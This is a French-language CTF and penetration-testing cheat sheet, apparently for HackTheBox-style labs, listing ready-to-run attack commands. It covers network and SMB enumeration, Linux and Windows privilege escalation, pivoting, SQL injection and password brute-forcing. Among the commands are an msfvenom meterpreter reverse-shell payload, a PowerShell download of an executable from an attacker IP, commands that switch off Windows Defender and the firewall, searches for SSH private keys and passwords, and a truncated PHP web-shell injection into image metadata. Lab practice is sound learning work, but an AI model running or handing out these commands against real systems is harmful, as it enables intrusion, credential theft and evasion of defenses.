# CTF-Cheat-Sheet


__Reverse shell__ :
https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md

__Scripts d’énumération automatique pour privesc__ :
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh  

__Enumération__
```bash
nmap (
-A : détection du système et des versions
-sP : simple ping scan
-sS/sT/sA/sW/sM: Scans TCP SYN/Connect()/ACK/Window/Maimon
-sN/sF/sX: Scans TCP Null, FIN et Xmas
-sU: Scan UDP
-T4 : Définit une temporisation[0-5]
)
nmap -A -T4 -sV 10.10.10.157

nmap --script "SCRIPT" -p "PORT" "IPADDRESS"
nmap –script smb-vuln* -p 139,445 10.10.10.134
```
__WEB__
nikto -h "URL" -p "PORTS"
nikto -h 192.168.0.1 -p 80,443

gobuster --url "IP ADDRESS" dir --wordlist "WORDLIST" -x "EXTENSION"
gobuster –url 10.10.10.157 dir –wordlist /usr/share/wordlists/dirb/big.txt -x php,txt,html,htm

-k -> pas de vérification du certificat SSL

smbclient --list //"IPADDRESS"/ -U ""
__Enumération des répertoires partagés accessibles en anonymous__

rpcclient -U "" -N 10.10.10.180/
__Bruteforcer les RID des comptes Windows__

crackmapexec smb DC.ustoun.local -u 'SVC-Kerb' -p /root/rockyou.txt
__Bruteforce SMB avec crackmapexec__

enum4linux -a 10.10.10.180
__Enumération SMB, RPC & co (WINDOWS)__


dirb "url" "wordlist"
dirb http://docker.hackthebox.eu:58651 /usr/share/dirb/wordlists/vulns/apache.txt

dirb options :
-a "agent" -> spécifie un user-agent
-R -> récursivité interactive
-o output.txt -> redirige l'output
wfuzz --hh="PARAM_SIZE" -w "WORDLIST" "URL".php?"PARAM_NAME"=test
wfuzz –hh=24 -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test


__Exploitation & Elévation de privilèges [LINUX] :__
python -c 'import pty; pty.spawn("/bin/sh")'
/usr/bin/script -qc /bin/bash /dev/null
__Pour obtenir un shell plus élevé, afin de passer d’un reverse shell à un shell complet__

searchsploit -t "INTITLE" "KEYWORDS" -w
searchsploit windows local smb

sudo -l
__-> liste les commandes autorisées pour l’utilisateur courant__

find / -type d -writable 2> /dev/null
__-> Liste les répertoires accessibles en écriture__

find /* -user root -perm -4000 -print 2>/dev/null
__-> Liste les binaires exécutables par l’utilisateur courant__

find / -type f -perm /6000 -ls 2>/dev/null
__-> Liste les fichiers setuid/setgid sur le système__

find / -iname "mon_fichier" -print 2>/dev/null
__-> Trouver un fichier précis sur le système__

find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
__-> Trouver des clés RSA ou des autorisations de connexion SSH__

grep -iR "passw"
__-> Rechercher du texte dans des fichiers d’une arborescence__

binwalk socute.jpg
__-> Vérifier le contenu d’une image (peut contenir des fichiers zip par exemple)__

exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>' "IMAGE"
exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>’ photo.png


__Exploitation & Elévation de privilèges [WINDOWS] :__
gem install evil-winrm
evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'
__Se connecter via le port winrm__

https://github.com/itm4n/PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
__Tester les privilèges de l’utilisateur__

whoami /priv
whoami /groups
__Liste des privilèges : https://github.com/gtworek/Priv2Admin__
__Lister les privilèges de l’utilisateur courant__

Get-Services
__Lister les services (Pour vérifier les unquoted services)__

Set-ExecutionPolicy Unrestricted
__Retirer les restrictions d’exécution de scripts__

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\toto\Desktop\wget.exe')"
__Télécharger un fichier depuis un serveur web__

msfvenom -p windows/meterpreter/reverse_tcp lhost="LOCALIP" lport="LOCALPORT" -f "FORMAT" > "OUTPUTFILE"
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.100 lport=4444 -f exe > payload.exe

https://github.com/AonCyberLabs/Windows-Exploit-Suggester
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py -d 2014-06-06-mssb.xlsx -i systeminfo.txt
__Vérifier les exploits disponibles en fonction du systeminfo de la victime__

https://github.com/PowerShellMafia/PowerSploit
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
Invoke-AllChecks
__Lancer un PowerShell sans restrictions, charger PowerUp et lancer le check complet__

powershell -c "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 'fDenyTSConnections' -value 0"
powershell -c "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
powershell -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
netsh advfirewall set allprofiles state off
__Activer le RDP et désactiver le firewall__

Set-MpPreference -PUAProtection 0
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableRealtimeMonitoring $true
__Désactiver Windows Defender en Powershell__


__Pivoting :__
__Sous Windows :__
KALI  WINDOWS1   WINDOWS2
10.10.14.33  172.16.1.1  172.16.2.1
__Ici Kali peut joindre WINDOWS1 mais pas WINDOWS2__
__Seul WINDOWS1 peut joindre WINDOWS2__

__sur le serveur (kali) :__
./chisel server --port 9000 --host 0.0.0.0 --reverse

__sur le client (WINDOWS1 172.16.1.1) :__
.\chisel.exe client 10.10.14.33:9000 R:1081:socks
__On monte un tunnel chisel et on affecte un socket sur un port du serveur Kali__

nano /etc/proxychains.conf
 socks5 127.0.0.1 1081
proxychains -q curl http://172.16.2.1
__Ensuite on modifie la configuration de proxychains sur Kali pour passer le trafic dans le socket et on peut joindre WINDOWS2__

__Sous Linux :__
KALI  LINUX1  LINUX2
10.10.14.33  10.10.10.1  10.10.12.1
__Ici Kali peut joindre LINUX1 mais pas LINUX2__
__Seul LINUXS1 peut joindre LINUX2__

Sur le serveur Kali :
ssh -ND 127.0.0.1:12000 root@10.10.10.1 -i id_rsa -v
__On monte une connexion ssh depuis Kali sur LINUX1 avec un socket sur le port 12000__

nano /etc/proxychains.conf
 socks5 127.0.0.1 12000
proxychains -q curl http://10.10.12.1
__Ensuite on modifie la configuration de proxychains sur Kali pour passer le trafic dans le socket et on peut joindre LINUX2__


__Injection SQL :__
sqlmap -u "URL" (--dbs / --tables -D "DATABASE" / --columns -D "DATABASE" -T "TABLENAME")
sqlmap -u http://bidule.fr/index.php?id= –columns -D information_schema -T USER_PRIVILEGES


__Bruteforce :__
__Cracker un hash SHA 512 avec un salage__
__Mettre dans un fichier le hash et la chaine de salage séparés par un caractère "$" puis :__
john sha512.hash -format='dynamic=sha512($p.$s)' --wordlist=rockyou.txt

__Cracker un zip chiffré avec une liste de mots de passe__
fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt secret.zip

crunch "MIN" "MAX" "CONTENT"
crunch 4 15 « abcdefghijklmnopqrstuvwxyz »

crackmapexec ssh 192.168.193.132 -u users.txt -p rockyou.txt
__tester une liste d’utilisateur avec une liste de mot de passe (SSH, SMB, WINRM)__

hydra -l "USER" -P "WORDLIST" "IP ADDRESS" "METHOD" "URL"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-get /monitoring

hydra -l "LOGIN" -P "WORDLIST" "URL" "METHOD""PAGE":"ARGUMENT"=^"VALUE"^:"INCORRECT STRING"" -w "THREADS" -s "PORT"
hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form « /index.php:password=^PASS^:Invalid password » -w 10 -s 45692

john --incremental "HASHFILE"
__Pour bruteforcer de façon incrémentale__

john "HASHFILE" --wordlist=/usr/share/wordlists/rockyou.txt
__Pour bruteforcer avec un dictionnaire__

__Script de bruteforce anti-CSRF :__
https://github.com/J3wker/anti-CSRF_Token-Bruteforce



